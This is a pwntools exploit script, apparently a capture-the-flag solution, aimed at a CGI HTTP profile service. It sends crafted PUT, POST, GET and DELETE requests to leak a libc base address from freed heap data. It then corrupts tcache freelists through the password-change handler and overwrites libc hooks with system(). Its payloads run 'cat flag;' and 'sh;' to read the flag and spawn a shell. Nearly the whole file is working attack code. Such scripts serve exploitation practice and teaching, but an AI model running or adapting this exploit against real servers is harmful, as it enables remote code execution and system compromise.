#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1
filename = "./cgi"
if LOCAL:
    io = process(filename)
else:
    remote_service = "175.20.22.30:9999"
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
libc = ELF("./libc-2.31.so", checksec=False)

rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass


def create(id, name, password, password_length):
    # io = remote(remote_service[0], int(remote_service[1]))
    data = b"""PUT /profile?id=""" + i2b(id) + b"""&name=""" + name +b"""&password=""" + password + b"""&password_length=""" + i2b(password_length) + b"""HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
""" + b"""/profile?id=""" + i2b(id) + b"""&name=""" + name +b"""&password=""" + password + b"""&password_length=""" + i2b(password_length) + b"""\r
\r
"""
    s(data)
    ru(b'HTTP/1.1')
    ru(b'Content-Length: ')
    length = int(ru(b"\r\n", "True"))
    ru(b"\r\n")
    recv = rn(length)
    print(recv)

def change_passwd(id, name, password):
    # io = remote(remote_service[0], int(remote_service[1]))
    data = b"""POST /profile?id=""" + i2b(id) + b"""&name=""" + name +b"""&password=""" + password + b""" HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
""" + b"""/profile?id=""" + i2b(id) + b"""&name=""" + name +b"""&password=""" + password + b"""\r
\r
"""
    s(data)
    ru(b'HTTP/1.1')
    ru(b'Content-Length: ')
    length = int(ru(b"\r\n", "True"))
    ru(b"\r\n")
    recv = rn(length)
    print(recv)

def show(id):
    # io = remote(remote_service[0], int(remote_service[1]))
    data = b"""GET /profile?id=""" + i2b(id) + b"""HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
""" + b"""/profile?id=""" + i2b(id) + b"""\r
\r
"""
    s(data)
    ru(b'HTTP/1.1')
    ru(b'Content-Length: ')
    length = int(ru(b"\r\n", "True"))
    ru(b"\r\n")
    recv = rn(length)
    print(recv)
    return recv

def delet(id):
    # io = remote(remote_service[0], int(remote_service[1]))
    data = b"""DELETE /profile?id=""" + i2b(id) + b"""HTTP/1.1\r
Host: 175.20.22.30:9999\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r
Accept-Encoding: gzip, deflate\r
DNT: 1\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
Pragma: no-cache\r
Cache-Control: no-cache\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 49
Origin: http://175.20.22.30:9999\r
\r
""" + b"""/profile?id=""" + i2b(id) + b"""\r
\r
"""
    s(data)
    ru(b'HTTP/1.1')
    ru(b'Content-Length: ')
    length = int(ru(b"\r\n", "True"))
    ru(b"\r\n")
    recv = rn(length)
    print(recv)

leak = 0
def get_data(id):
    global leak
    test_data = show(id).split(b"&")
    return_list = []
    for i in test_data:
        print(i)
        leak = uu64(i.replace(b"name=", b"").replace(b"password=", b""))
        return_list.append(leak)
        lg("leak")
    return return_list

debugPID()

create(0, b"a" + i2b(0), b"a"*8, 0x600)
create(1, b"a" + i2b(1), b"a"*8, 0x600)
delet(0)
libc_base = get_data(0)[1] - 0x1ecbe0
lg("libc_base")

create(2, b"a", b"a"*8, 0x80)
create(3, b"a", b"a"*8, 0x80)
create(4, b"a", b"a"*8, 0x80)
create(5, b"a", b"a"*8, 0x80)
delet(2)
delet(3)
delet(4)
change_passwd(4, p64(libc_base+0x1eeef8-0x18)[:6] + b"%00"*2, p64(libc_base+0x1eee48-0x18)[:6] + b"%00"*2)
# get_data(2)
create(6, p64(libc_base+0x1eeef8-0x18)[:6] + b"%00"*2, b"cat flag;".ljust(0x18, b"s") + p64(libc_base+libc.symbols["system"]).replace(b"\x00", b"%00"), 0x80)
create(7, b"%00", b"sh;".ljust(0x18, b"s") + p64(libc_base+libc.symbols["system"]).replace(b"\x00", b"%00"), 0x80)
delet(6)



# for i in range(10):
#     create(i, b"a" + i2b(i), b"a"*8, 0x20)
# for i in range(7):
#     delet(i)
# delet(8)
# delet(9)
# delet(8)
# heap_base = (get_data(8)[1])
# lg("heap_base")

# create(10, b"a" + i2b(0), b"a"*8, 0x500)
# create(11, b"a" + i2b(0), b"a"*8, 0x60)
# delet(10)
# get_data(10)

# for i in range(10):
#     create(i, b"a" + i2b(i), i2b(i)*8, 0x40)
# for i in range(7):
#     delet(i)

ia()
